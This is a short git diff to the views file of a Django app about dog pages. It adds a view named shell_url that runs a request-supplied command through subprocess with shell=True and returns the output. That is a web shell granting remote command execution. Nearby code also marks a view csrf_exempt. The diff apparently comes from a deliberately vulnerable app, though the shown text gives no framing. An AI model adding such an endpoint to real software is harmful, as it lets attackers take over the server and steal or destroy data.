@@ -5,7 +5,7 @@ from .models import Dogs
 from django.db import connection
 from django.views.decorators.csrf import csrf_exempt
 # Create your views here.
-
+import subprocess
 
 def index(request):
     dogs = Dogs.objects.all()
@@ -20,6 +20,10 @@ def index(request):
 def dog_page(request, dog_id):
     dog = get_object_or_404(Dogs, pk=dog_id)
     return HttpResponse("Your dog, %s, is lovely. Boss name is : %s" % (dog.dog_name, dog.dog_boss))
+
+def shell_url(request, user_command):
+    result = subprocess.run(user_command, capture_output=True, text=True, shell=True)
+    return HttpResponse(str(result.stdout))
 
 @csrf_exempt
 def create_dogpage(request):
